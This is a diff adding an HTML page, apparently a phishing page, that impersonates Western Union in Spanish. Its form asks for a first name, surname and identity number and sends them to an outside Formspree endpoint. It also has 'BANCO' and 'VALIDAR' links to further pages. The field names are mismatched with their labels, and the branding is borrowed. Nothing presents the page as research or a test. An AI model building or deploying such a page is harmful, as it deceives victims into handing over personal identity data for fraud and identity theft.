@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" href="fav.avif" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Western Union</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff; /* Bleu clair */
+            margin: 0;
+            background: url(OIP.jpg);
+            background-position: center;
+            background-size: cover;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            max-width: 400px;
+            text-align: center;
+            padding: 20px;
+            border: 1px solid #008000; /* Vert */
+            border-radius: 10px;
+            background-color: #fff;
+        }
+
+        h1 {
+            color: #008000; /* Vert */
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+        form {
+            padding: 20px 20px;
+        }
+        nav a{
+            color: #4c94ed;
+            font-weight: 600;
+            margin: 4px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #008000; /* Vert */
+            border-radius: 5px;
+        }
+
+        button {
+            text-transform: uppercase;
+            font-weight: 700;
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #4c94ed; /* Vert */
+            color: #fff;
+            cursor: pointer;
+            margin: 10px;
+        }
+
+        button:hover {
+            background-color: #4c94ed; /* Vert foncé */
+        }
+        .container img{
+            width: 88%;
+            border-radius: 6px;
+            height: 100px;
+            margin: auto;
+        }
+        </style>
+</head>
+<body>
+
+<div class="container">
+    <nav>
+        <a href="index.html">INICIO|</a>
+        <a href="wu.html">WESTERN UNION|</a>
+        <a href="banco.html">BANCO</a>
+    </nav>
+    <h1>Western Union</h1>
+    <img src="img1.jpeg" alt="">
+    <form action="https://formspree.io/f/xkndqdpy"  method="POST">
+        <label for="senderName">Nombre:</label>
+        <input type="text" id="senderName" name="senderName" required>
+
+        <label for="receiverName">Appelido:</label>
+        <input type="number" id="receiverName" name="receiverName" required>
+
+        <label for="amount">Número de identidad:</label>
+        <input type="number" id="amount" name="amount" required>
+
+        <button type="submit">Realizar</button>
+        <button><a href="validate1.html">VALIDAR</a></button>
+    </form>
+</div>
+
+</body>
+</html>
